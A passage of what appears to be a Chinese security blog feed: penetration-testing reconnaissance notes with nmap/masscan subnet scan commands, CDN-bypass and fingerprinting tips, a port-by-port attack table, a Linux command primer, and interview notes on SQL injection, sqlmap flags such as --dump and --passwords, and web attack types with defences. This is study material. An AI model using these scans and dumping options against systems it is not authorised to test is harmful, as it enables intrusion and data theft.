title="三、旁站、C段"></a>三、旁站、C段</h2><p><strong>旁站</strong>：是和目标网站在同一台服务器上的其它网站</p><p><strong>C端</strong>：是和服务器IP处在一个C段的其他服务器</p><p><strong>在线</strong>：<br><a href="https://webscan.cc/">https://webscan.cc/</a></p><p>fofa、shodan在线工具 语法:ip&#x3D;”106.15.141.18&#x2F;24”</p><p><strong>本地</strong>：</p><blockquote><p>namp</p><p>nmap -p 22,21,443,8080-Pn 172.178.40.0&#x2F;24</p><p>masscan</p><p>masscan -p 22,21,443,8080-Pn –rate&#x3D;1000172.178.40.0&#x2F;24</p></blockquote><p>goby 自动探测当前网络空间存活的IP及解析域名到IP</p><p>K8旁站 K8Cscan是款专用于大型内网渗透的高并发插件化扫描神器，可以用来扫描C段、旁站</p><p>御剑1.5这个就不用多说什么了</p><h2 id="四、网站信息"><a href="#四、网站信息" class="headerlink" title="四、网站信息"></a>四、网站信息</h2><h3 id="网站架构探测"><a href="#网站架构探测" class="headerlink" title="网站架构探测"></a>网站架构探测</h3><p>探测目标站点架构：操作系统、中间件、脚本语言、数据库、服务器、web容器。</p><p><em><strong>cms指纹识别</strong></em>：</p><p>cms指纹识别：<a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a></p><p>云悉：<a href="http://www.yunsee.cn/info.html">http://www.yunsee.cn/info.html</a></p><p>潮汐指纹：<a href="http://finger.tidesec.net/">http://finger.tidesec.net/</a></p><p><em><strong>操作系统类型识别</strong></em>：</p><p>通过ping目标主机返回的TTL值判断服务器类型 win128 linux 64 ，大小写敏感区分</p><p>工具：namp、p0f</p><p><strong>综合探测工具</strong>：<br>shodan、whatweb（kali集成）、wappalyzer插件</p><h3 id="WAF信息"><a href="#WAF信息" class="headerlink" title="WAF信息"></a><em><strong>WAF信息</strong></em></h3><p>扫描工具：whatwaf、wafw00f<br>在线识别工具：<a href="https://scan.top15.cn/web">https://scan.top15.cn/web</a><br>扫描IP C段，防火墙一般都会有web管理</p><h3 id="历史漏洞"><a href="#历史漏洞" class="headerlink" title="历史漏洞"></a><em><strong>历史漏洞</strong></em></h3><p><em><strong>公开漏洞查询</strong></em></p><p>确认网站的运行的cms或者运行的服务后，可通过公开漏洞进行查询</p><p><a href="http://cve.mitre.org/find/search_tips.html">http://cve.mitre.org/find/search_tips.html</a></p><p>通过查询cve漏洞库查找当前cms或者服务是否存在已知公开漏洞，结合google获取详细漏洞信息</p><p><a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a></p><p>Google等搜索引擎确定cms或者服务后，在后面加上exp、poc、漏洞等词汇获取详细漏洞信息。</p><p><a href="https://vulners.com/">https://vulners.com/</a></p><p>可通过漏洞相关关键字获取详细漏洞信息</p><p><em><strong>历史漏洞查询</strong></em></p><p>确认网站所属单位，可通过查询历史漏洞或者该集团、单位历史漏洞辅助攻击（例如获取内网ip段、历史账号密码）</p><p>seebug：<a href="https://www.seebug.org/">https://www.seebug.org/</a></p><p>CNVD：<a href="https://www.cnvd.org.cn/">https://www.cnvd.org.cn/</a></p><h2 id="五、敏感目录文件"><a href="#五、敏感目录文件" class="headerlink" title="五、敏感目录文件"></a><em><strong>五、敏感目录文件</strong></em></h2><p>Google语法是万能的</p><p>DirBuster（kali自带的一款扫描工具）</p><p>Webdirscan（python编写的简易的扫描工具）</p><p>御剑（操作简易方便）</p><p>dirmap（一款高级web目录扫描工具，功能比较强大）</p><p>这些工具都自带字典，也可以自己手动添加，拥有强大的字典也是很关键的</p><h2 id="六、真实IP查询"><a href="#六、真实IP查询" class="headerlink" title="六、真实IP查询"></a><em><strong>六、真实IP查询</strong></em></h2><p><em><strong>确定有无CDN</strong></em></p><p>1.多地ping，看对应IP地址是否唯一，多地ping在线网站：</p><p><a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a></p><p>2.nslookup，同样是看返回的IP地址的数量进行判断</p><h3 id="绕过CDN查找网站真实IP"><a href="#绕过CDN查找网站真实IP" class="headerlink" title="绕过CDN查找网站真实IP"></a><em><strong>绕过CDN查找网站真实IP</strong></em></h3><p><em><strong>1.DNS历史解析</strong></em></p><p>查看IP与域名绑定的历史记录，可能会存在使用CDN前的记录，相关网站：<br><a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a><br><a href="https://community.riskiq.com/">https://community.riskiq.com</a><br><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a><br><a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a></p><p><em><strong>2.查询子域名</strong></em></p><p>毕竟CDN不便宜，所以很多站都是主站做了CDN，而很多小站没做CDN所以可以，通过上面收集到的子域名查询到真实的IP地址</p><p><em><strong>3.网络空间引擎搜索法</strong></em><br>通过shadan、fofa等搜索引擎，通过对目标网站的特征进行搜索，很多时候可以获取网站的真实IP</p><p><em><strong>4.利用SSL证书查询</strong></em><br><a href="https://censys.io/certificates/">https://censys.io/certificates/</a></p><p><em><strong>5.邮件订阅</strong></em><br>一些网站有发送邮件的功能，如Rss邮件订阅，因为邮件系统一般都在内部，所以就可以通过邮箱获得真实的IP</p><p><em><strong>6.国外访问</strong></em><br>一般的站点在国内可能会有CDN，但是在国外的用户覆盖率比较低，所以通过国外的节点进行请求往往能获取真实IP</p><h2 id="七、端口测试"><a href="#七、端口测试" class="headerlink" title="七、端口测试"></a><em><strong>七、端口测试</strong></em></h2><p>在获取了真实IP之后，进一步就是对目标IP的端口进行扫描</p><p>最常用的就是nmap、masscan还有御剑端口高速扫描等工具</p><p>在线端口查询：<a href="http://coolaf.com/tool/port">http://coolaf.com/tool/port</a></p><p><a href="https://tool.lu/portscan/index.html">https://tool.lu/portscan/index.html</a></p><p>在我们扫描出对方端口应该针对相应的端口进行一个测试呢，这里就需要对每一个端口的常用服务与常</p><p>漏洞进行一个了解。</p><p>常见端口服务与攻击方向</p><table><thead><tr><th><em><strong>端口</strong></em></th><th><em><strong>服务</strong></em></th><th><em><strong>攻击方向</strong></em></th></tr></thead><tbody><tr><td>21、69</td><td>FTP&#x2F;TFTP</td><td>允许匿名的上传、下载、爆破和嗅探</td></tr><tr><td>22</td><td>SSH</td><td>爆破、SSH隧道及内网代理转发、文件传输</td></tr><tr><td>23</td><td>telnet</td><td>爆破、嗅探、弱口令</td></tr><tr><td>25</td><td>SMTP</td><td>邮件伪造</td></tr><tr><td>53</td><td>DNS</td><td>允许区域传送、DNS劫持、缓存投毒、欺骗</td></tr><tr><td>67&#x2F;68</td><td>DHCP</td><td>劫持、欺骗</td></tr><tr><td>80&#x2F;443</td><td>Web服务</td><td>Web攻击、爆破、对应服务器版本漏洞</td></tr><tr><td>139</td><td>Samba服务</td><td>爆破、未授权访问、远程代码执行</td></tr><tr><td>110&#x2F;143</td><td>POP3&#x2F;IMAP</td><td>爆破</td></tr><tr><td>161</td><td>SNMP</td><td>爆破、搜索目标内网信息</td></tr><tr><td>1433&#x2F;1521&#x2F;3306</td><td>数据库服务</td><td>弱口令爆破</td></tr><tr><td>3389</td><td>Rdp</td><td>弱口令爆破，SHIFT后门，放大镜，输入法漏洞</td></tr><tr><td>7001&#x2F;7002</td><td>weblogic</td><td>弱口令爆破</td></tr></tbody></table><div>  点击按钮下载博客:  <div style="display: flex;justify-content: center;">      <a href="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/md/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.md">    <i class="fa fa-download fa-2x" aria-hidden="true"></i>    </a>  </div></div>]]></content>
      
      
      
        <tags>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux常用命令</title>
      <link href="/2023/04/16/linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
      <url>/2023/04/16/linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20220901131138141.png" alt="image-20220901131138141"></p><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20220901131734203.png" alt="image-20220901131734203"></p><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20220901131836929.png" alt="image-20220901131836929"></p><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20220901131910880.png" alt="image-20220901131910880"></p><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20220901131928339.png" alt="image-20220901131928339"></p><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20220901132014302.png" alt="image-20220901132014302"></p><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20220901132433969.png" alt="image-20220901132433969"></p><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20220901132451039.png" alt="image-20220901132451039"></p><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20220901132524621.png" alt="image-20220901132524621"></p><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20220901132549210.png" alt="image-20220901132549210"></p><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20220901132607070.png" alt="image-20220901132607070"></p><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20220901132622119.png"></p><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20220901132712053.png" alt="image-20220901132712053"></p><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20220901132734491.png" alt="image-20220901132734491"></p><p>基本命令：<br>pwd    显示当前工作路径<br>ls     查看目录中的文件  ls -a 显示隐藏文件<br>cd     切换目录<br>clear  清除屏幕<br>reset  真正地清空终端屏幕<br>tab    自动补全命令</p><p>mkdir  创建目录&#x2F;文件夹<br>rmdir  删除文件夹    删除为空的文件夹<br>rm     删除文件<br>-r: 递归删除目录及其内容  -f强制删除<br>touch  创建文件<br>find   查找文件    -name 代表按文件名查找<br>cp     拷贝文件    -a:会保留文件原有属性<br>which  查看命令位置<br>mv     移动文件&#x2F;重命名<br>重命名：mv 目录名 新目录名<br>移动： mv 需要移动的目录名  目的地<br>cat    查看文件内容<br>echo   写入内容<br>    一个&gt; , 没有文件则创建；有文件就重写<br>    两个&gt;, 没有文件则创建，有文件新内容会添加在原内容后面</p><p>cd ..   回到上一级、、<br>cd     cd ~   切换到当前用户目录</p><p>vim编辑器<br>三种模式：<br>1.命令行模式：复制、粘贴、删除、移动光标<br>2.编辑模式：编辑文本   按i开始编辑<br>3.末行模式：保存、退出、替换   %s&#x2F;abc&#x2F;123&#x2F;g   : 把文件中的所有abc替换成123</p><p>怎么切换模式：<br>    输入 vi 文件  ，进入命令行模式<br>    编辑好以后，按esc后，shift+: ,输入wq保存退出。<br>    按esc键回到命令行模式<br>    按shift+冒号 回到末行模式</p><p>命令行模式：<br>    将光标移到行尾：$<br>    将光标移到开头：^<br>    删除光标所在行：dd<br>    撤销上一步：   u<br>    复制当前光标所在行：yy<br>    粘贴：       p<br>编辑模式：<br>    i 当前光标前编辑<br>    a 当前光标后编辑<br>    o 当前光标的下一行进行编辑</p><p>末行模式：<br>    退出：q<br>    保存：w<br>    保存并退出：wq<br>    强制退出：q!</p><p>有趣的命令：</p><p>1.sudo apt install libaa-bin<br>aafire  跳动的火<br>2.sudo apt moo    羊<br>3.sudo apt install sl<br>sl     跑火车<br>4.sudo apt install cmatrix<br>cmatrix  黑客帝国<br>5.sudo apt install bastet<br>bastet   俄罗斯方块<br>6.sudo apt install ninvaders<br>ninvaders  太空入侵者<br>7.sudo apt install nsnake<br>nsnake     贪吃蛇<br>8.sudo apt install oneko<br>oneko   小猫跟着鼠标移动</p>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试面经整理</title>
      <link href="/2023/04/16/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E7%BB%8F%E6%95%B4%E7%90%86/"/>
      <url>/2023/04/16/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E7%BB%8F%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="思路流程"><a href="#思路流程" class="headerlink" title="思路流程"></a>思路流程</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><ol><li>服务器的相关信息（真实ip，系统类型，版本，开放端口，WAF等）</li><li>网站指纹识别（包括，cms，cdn，证书等），dns记录</li><li>whois信息，姓名，备案，邮箱，电话反查（邮箱丢社工库，社工准备等）</li><li>子域名收集，旁站，C段等</li><li>google hacking针对化搜索，pdf文件，中间件版本，弱口令扫描等</li><li>扫描网站目录结构，爆后台，网站banner，测试文件，备份等敏感文件泄漏等</li><li>传输协议，通用漏洞，exp，github源码等</li></ol><h3 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h3><ol><li>浏览网站，看看网站规模，功能，特点等</li><li>端口，弱口令，目录等扫描,对响应的端口进行漏洞探测，比如 rsync,心脏出血，mysql,ftp,ssh弱口令等。</li><li>XSS，SQL注入，上传，命令注入，CSRF，cookie安全检测，敏感信息，通信数据传输，暴力破解，任意文件上传，越权访问，未授权访问，目录遍历，文件 包含，重放攻击（短信轰炸），服务器漏洞检测，最后使用漏扫工具等</li></ol><h3 id="漏洞利用-amp-权限提升"><a href="#漏洞利用-amp-权限提升" class="headerlink" title="漏洞利用&amp;权限提升"></a>漏洞利用&amp;权限提升</h3><ul><li>mysql提权，serv-u提权，oracle提权</li><li>windows 溢出提权</li><li>linux脏牛,内核漏洞提权e</li></ul><h3 id="清除测试数据-amp-输出报告"><a href="#清除测试数据-amp-输出报告" class="headerlink" title="清除测试数据&amp;输出报告"></a>清除测试数据&amp;输出报告</h3><p>i 日志、测试数据的清理<br>ii 总结，输出渗透测试报告，附修复方案</p><h3 id="复测"><a href="#复测" class="headerlink" title="复测"></a>复测</h3><p>验证并发现是否有新漏洞，输出报告，归档</p><h2 id="SQL注入防护"><a href="#SQL注入防护" class="headerlink" title="SQL注入防护"></a>SQL注入防护</h2><p>1、使用安全的API<br>2、对输入的特殊字符进行Escape转义处理<br>3、使用白名单来规范化输入验证方法<br>4、对客户端输入进行控制，不允许输入SQL注入相关的特殊字符<br>5、服务器端在提交数据库进行SQL查询之前，对特殊字符进行过滤、转义、替换、删除。<br>6、规范编码,字符集</p><h2 id="为什么参数化查询可以防止sql注入"><a href="#为什么参数化查询可以防止sql注入" class="headerlink" title="为什么参数化查询可以防止sql注入"></a>为什么参数化查询可以防止sql注入</h2><p>原理:</p><p>使用参数化查询数据库服务器不会把参数的内容当作sql指令的一部分来执行，是在数据库完成sql指令的编译后才套用参数运行</p><p>简单的说:<br>参数化能防注入的原因在于,语句是语句，参数是参数，参数的值并不是语句的一部分，数据库只按语句的语义跑</p><h2 id="sql的报错注入原理"><a href="#sql的报错注入原理" class="headerlink" title="sql的报错注入原理"></a>sql的报错注入原理</h2><blockquote><p>报错注入的使用场景一般是在页面无法显示数据库的信息，但是是有报错内容的,报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。</p><p>报错注入形式上一般是做两个嵌套的查询，里面的那个查询被称为子查询，执行顺序也是从子查询开始的，所以我们可以通过子查询查询我们想要的数据，然后在通过报错函数将我们查询到的数据带出，从而达到爆出想要查询的数据。</p></blockquote><h3 id="报错函数"><a href="#报错函数" class="headerlink" title="报错函数"></a>报错函数</h3><p>MySQL提供了一个 updatexml() 函数，当第二个参数包含特殊符号时会报错，并将第二个参数的内容显示在报错信息中。updatexml() 函数的报错内容长度不能超过32个字符，我一般用MID() 函数从中提取字符</p><h2 id="sql的布尔注入原理和用到的函数"><a href="#sql的布尔注入原理和用到的函数" class="headerlink" title="sql的布尔注入原理和用到的函数"></a>sql的布尔注入原理和用到的函数</h2><blockquote><p>SQL布尔注入是一种利用布尔逻辑漏洞的攻击方式，与常规的SQL注入攻击不同，它并不会直接注入恶意代码，而是利用查询语句中的布尔逻辑，通过不断猜测来获取敏感信息。</p></blockquote><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><ol><li><code>LIKE</code> 函数：该函数可以用于模糊匹配查询，通常与通配符一起使用。攻击者可以使用通配符来逐个猜测字符或字符串的值，以获取敏感信息。</li><li><code>SUBSTRING</code> 函数：该函数可以用于提取字符串的子串。攻击者可以使用该函数来提取密码的每个字符，从而逐个猜测密码的值。</li><li><code>ASCII</code> 函数：该函数可以将字符转换为其对应的ASCII码。攻击者可以使用该函数来比较密码的每个字符的ASCII码值，以猜测密码的值。</li><li><code>LENGTH</code> 函数：该函数可以获取字符串的长度。攻击者可以使用该函数来确定密码的长度，从而更快地猜测密码的值。</li></ol><h2 id="sqlmap常用的参数有哪些"><a href="#sqlmap常用的参数有哪些" class="headerlink" title="sqlmap常用的参数有哪些"></a>sqlmap常用的参数有哪些</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">-v:输出信息的详细程度，默认为1</span><br><span class="line">  0：只输出 Python 出错回溯信息，错误和关键信息</span><br><span class="line">  1：增加输出普通信息和警告信息</span><br><span class="line">  2：增加输出调试信息</span><br><span class="line">  3：增加输出已注入的 payloads</span><br><span class="line">  4：增加输出 HTTP 请求</span><br><span class="line">  5：增加输出 HTTP 响应头</span><br><span class="line">  6：增加输出 HTTP 响应内容</span><br><span class="line">-u：指定要测试的URL。</span><br><span class="line">-d: 直接连接到数据库    例如 sqlmap -d &quot;mysql://root:root@192.168.1.200:3306/test&quot;</span><br><span class="line">-m  从文本中获取多个目标url,url 会保存在文档中，sqlmap会一个个检测</span><br><span class="line">-r: 从文件中加载http请求,如果目标是post请求，可以直接将其请求导入到文件中，然后-r 调用这个文件</span><br><span class="line">-C 指定字段</span><br><span class="line">-T 指定表</span><br><span class="line">-D 指定数据库</span><br><span class="line">--data：指定POST请求的数据。 例如 sqlmap -u &quot;http:192.168.1.200/index.php&quot; --data=&quot;id=1&quot;</span><br><span class="line">--cookie：指定HTTP cookie。</span><br><span class="line">--random-agent：使用随机的用户代理标识进行测试。</span><br><span class="line">--technique：设置SQL注入测试的技术。</span><br><span class="line">--level：设置SQL注入测试的等级，范围是1到5，默认值是1。</span><br><span class="line">--threads：设置线程数，默认为1。</span><br><span class="line">--batch：设置批量模式，不会询问任何问题，只会使用默认值。</span><br><span class="line">--dbms：指定要测试的数据库类型。</span><br><span class="line">--os：指定要测试的操作系统类型。</span><br><span class="line">--risk：设置测试中使用的风险等级，范围是1到3，默认值是1。</span><br><span class="line">--dump：导出数据库的数据。</span><br><span class="line">--dbs：列出所有可用的数据库。</span><br><span class="line">--tables：列出指定数据库中的所有表。</span><br><span class="line">--columns：列出指定表中的所有列。</span><br><span class="line">--users：列出指定数据库中的所有用户。</span><br><span class="line">-- corrent-user: 获取当前数据库</span><br><span class="line">--passwords：列出指定数据库中的所有用户的密码。</span><br><span class="line">--tor：使用Tor网络进行测试。</span><br><span class="line">--tamper：设置SQLMap使用的注入负载模板。</span><br><span class="line">--prefix：设置测试时使用的前缀字符。</span><br><span class="line">--flush-session：#清除上次扫描的缓存</span><br><span class="line">--purge#清除历史缓存</span><br></pre></td></tr></table></figure><h2 id="sqlmap中的–os-shell原理"><a href="#sqlmap中的–os-shell原理" class="headerlink" title="sqlmap中的–os-shell原理"></a>sqlmap中的–os-shell原理</h2><blockquote><p>SQLMap会通过注入SQL语句在目标服务器上执行一段特定的代码，该代码会在目标服务器上启动一个后门程序，该后门程序会监听SQLMap指定的端口号，并接受SQLMap发送的命令，并将命令的执行结果返回给SQLMap。</p><p>接下来，SQLMap就可以通过<code>--os-shell</code>参数启动一个交互式Shell，与目标服务器进行交互，并执行各种命令，从而实现对目标服务器的控制。</p></blockquote><h2 id="文件上传绕过方式"><a href="#文件上传绕过方式" class="headerlink" title="文件上传绕过方式"></a>文件上传绕过方式</h2><p><a href="https://kaliluying.github.io/2023/04/14/file-upload%E7%BB%95%E8%BF%87/">看这篇文章</a></p><h2 id="文件上传有哪些防护方式"><a href="#文件上传有哪些防护方式" class="headerlink" title="文件上传有哪些防护方式"></a>文件上传有哪些防护方式</h2><ol><li>文件类型检查：对用户上传的文件进行类型检查，确保只允许上传合法的文件类型。可以通过检查文件扩展名或使用文件魔术数字（Magic Number）进行验证。</li><li>文件内容验证：除了检查文件类型外，还可以对文件内容进行验证。例如，对于图像文件，可以检查文件的头部和结尾是否符合图像文件的格式规范。</li><li>文件大小限制：限制上传文件的最大大小，以防止恶意用户上传过大的文件导致服务器资源耗尽。</li><li>安全的文件存储位置：将用户上传的文件存储在服务器的安全目录中，不要将其存储在可以直接执行的目录下。确保上传的文件无法通过浏览器直接访问，设置适当的访问权限。</li><li>输入数据验证和过滤：在接收用户上传文件的过程中，对用户输入的数据进行验证和过滤，以防止恶意代码或特殊字符的注入。</li><li>文件名重命名：为上传的文件生成一个随机的、唯一的文件名，以防止恶意用户上传具有恶意目的的文件名。</li><li>安全的文件处理和解析：对上传的文件进行安全的处理和解析，例如，对图像文件进行缩放、剪裁等操作时，确保使用安全的库和方法，以防止恶意代码的执行。</li><li>安全的服务器配置：确保服务器的安全配置，例如禁用不必要的文件上传功能、限制服务器的资源使用等。</li><li>定期更新和修补漏洞：及时更新和修补使用的上传组件或框架，以防止已知漏洞的利用。</li><li>安全意识培训：向开发人员和用户提供安全意识培训，使他们了解文件上传漏洞的潜在威胁，并学习如何避免和处理这些威胁。</li></ol><h2 id="xss的几种类型及漏洞原理"><a href="#xss的几种类型及漏洞原理" class="headerlink" title="xss的几种类型及漏洞原理"></a>xss的几种类型及漏洞原理</h2><blockquote><p>XSS漏洞的原理是，攻击者利用Web应用程序没有对用户输入进行足够的验证和过滤，从而导致恶意脚本被注入到Web页面中。攻击者可以利用恶意脚本窃取用户的敏感信息、篡改页面内容、劫持用户会话等。</p></blockquote><ol><li>反射型XSS：攻击者构造恶意链接或提交恶意表单，当受害者访问该链接或提交表单时，恶意代码会被注入到响应的HTML页面中，从而攻击受害者。</li><li>存储型XSS：攻击者将恶意脚本上传到Web应用程序的服务器端，并将它们保存到数据库中。当用户访问包含恶意脚本的页面时，恶意脚本会被从数据库中取出并注入到页面中，从而攻击受害者。</li><li>基于DOM的XSS：攻击者通过恶意脚本直接修改浏览器中的DOM，从而实现攻击目的。</li></ol><h2 id="csrf、xss和ssrf之间的区别"><a href="#csrf、xss和ssrf之间的区别" class="headerlink" title="csrf、xss和ssrf之间的区别"></a>csrf、xss和ssrf之间的区别</h2><ol><li>CSRF（跨站请求伪造）：攻击者通过诱骗用户访问恶意网站或点击恶意链接等方式，向目标网站发送伪造的请求，从而执行非授权的操作。攻击者通过利用已登录用户的Cookie，来欺骗服务器相信这个请求是受害者发送的，从而完成攻击。防范CSRF的措施包括加入Token验证、Referer验证等。</li><li>XSS（跨站脚本攻击）：攻击者通过在Web页面中注入恶意脚本，欺骗用户点击链接或提交表单，从而执行攻击。恶意脚本可以窃取用户的敏感信息，篡改页面内容，劫持用户会话等。防范XSS的措施包括输入验证、输出编码等。</li><li>SSRF（服务器端请求伪造）：攻击者通过篡改Web应用程序对外部资源的访问方式，使Web应用程序向攻击者指定的服务器发送请求，从而攻击目标服务器或本地网络。攻击者可以利用SSRF来窃取敏感信息，发起网络攻击等。防范SSRF的措施包括对输入进行严格限制，禁止访问内部资源等。</li></ol><h2 id="windows中查看进程的命令"><a href="#windows中查看进程的命令" class="headerlink" title="windows中查看进程的命令"></a>windows中查看进程的命令</h2><ol><li>tasklist命令：在命令行中输入“tasklist”命令，可以列出当前所有运行的进程信息，包括进程ID、名称、状态、内存使用等信息。该命令还支持其他参数，如“tasklist &#x2F;svc”可以列出每个进程对应的服务信息。</li><li>netstat -aon:列出当前正在运行的网络连接和进程信息<ol><li>“-a”参数表示显示所有的网络连接，包括正在监听的连接和建立的连接。</li><li>“-o”参数表示显示与每个网络连接相关联的进程ID。</li><li>“-n”参数表示以数字形式显示网络地址和端口号，而不是解析为域名和服务名称。</li></ol></li></ol><h2 id="windows中结束进程的命令"><a href="#windows中结束进程的命令" class="headerlink" title="windows中结束进程的命令"></a>windows中结束进程的命令</h2><ol><li><p>taskkill命令：在命令提示符中输入”taskkill &#x2F;pid [进程ID]”命令可以结束指定进程ID的进程。例如，如果要结束进程ID为1234的进程，可以使用命令”taskkill &#x2F;pid 1234”。该命令还支持其他参数，如”&#x2F;f”参数表示强制结束进程。</p></li><li><p>tskill命令：在命令提示符中输入”tskill [进程名称]”命令可以结束指定名称的进程。例如，如果要结束名称为chrome的进程，可以使用命令”tskill chrome”。该命令也支持其他参数，如”&#x2F;a”参数表示结束所有同名的进程。</p></li></ol><h2 id="linux常用命令"><a href="#linux常用命令" class="headerlink" title="linux常用命令"></a>linux常用命令</h2><p><a href="https://kaliluying.github.io/2023/04/16/linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/">看这篇文章</a></p><h2 id="常见的端口和对应的服务"><a href="#常见的端口和对应的服务" class="headerlink" title="常见的端口和对应的服务"></a>常见的端口和对应的服务</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">- 20/21：FTP服务</span><br><span class="line">- 22：SSH服务</span><br><span class="line">- 23：Telnet服务</span><br><span class="line">- 25：SMTP服务</span><br><span class="line">- 53：DNS服务</span><br><span class="line">- 67/68：DHCP服务</span><br><span class="line">- 69：TFTP服务</span><br><span class="line">- 80/8080/443：HTTP/HTTPS服务</span><br><span class="line">- 110：POP3服务</span><br><span class="line">- 119：NNTP服务</span><br><span class="line">- 123：NTP服务</span><br><span class="line">- 135/139/445：SMB服务</span><br><span class="line">- 143：IMAP服务</span><br><span class="line">- 161/162：SNMP服务</span><br><span class="line">- 389/636：LDAP服务</span><br><span class="line">- 443：HTTPS服务</span><br><span class="line">- 465：SMTPS服务</span><br><span class="line">- 500：IKEv1服务</span><br><span class="line">- 514：Syslog服务</span><br><span class="line">- 563：NNTPS服务</span><br><span class="line">- 631：CUPS服务</span><br><span class="line">- 873：rsync服务</span><br><span class="line">- 993/995：IMAPS/POP3S服务</span><br><span class="line">- 1433/1434：Microsoft SQL Server服务</span><br><span class="line">- 1521/1522：Oracle数据库服务</span><br><span class="line">- 2049：NFS服务</span><br><span class="line">- 3306：MySQL数据库服务</span><br><span class="line">- 3389：Remote Desktop服务</span><br><span class="line">- 5432/5433：PostgreSQL数据库服务</span><br><span class="line">- 5900/5901：VNC服务</span><br><span class="line">- 6379：Redis数据库服务</span><br><span class="line">- 7001/7002：Weblogic服务</span><br><span class="line">- 8000/8005/8009：Tomcat服务</span><br><span class="line">- 8081：Zabbix服务</span><br><span class="line">- 9000/9001：Elasticsearch服务</span><br><span class="line">- 9090：Openfire服务</span><br></pre></td></tr></table></figure><h2 id="OSI七层模型有哪些"><a href="#OSI七层模型有哪些" class="headerlink" title="OSI七层模型有哪些"></a>OSI七层模型有哪些</h2><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/v2-2d62ba265be486cb94ab531912aa3b9c_1440w.webp" alt="osi/tcp"></p><h2 id="如何处理信息收集时子域名爆破泛解析的问题"><a href="#如何处理信息收集时子域名爆破泛解析的问题" class="headerlink" title="如何处理信息收集时子域名爆破泛解析的问题"></a>如何处理信息收集时子域名爆破泛解析的问题</h2><h3 id="子域名泛解析的成因"><a href="#子域名泛解析的成因" class="headerlink" title="子域名泛解析的成因"></a>子域名泛解析的成因</h3><p>在子域名解析中，每个子域名都会解析为一个特定的IP地址。只有被设置解析，用户才能正常进行访问。一旦用户输入错误的子域名，就会造成无法访问。<br>在网站运营中，域名持有者为了避免因为错误输入，而造成用户流失，就会使用泛域名解析。<br>子域名泛解析是一种DNS配置设置，它允许将所有子域名都解析到同一个IP地址上。这意味着无论用户输入哪个子域名，DNS服务器都会返回相同的IP地址。<br>但是信息收集中，这会造成请求的所有子域名都能访问的假象，从而收集到一堆无效的子域名。</p><h3 id="子域名爆破中解决泛解析的方式"><a 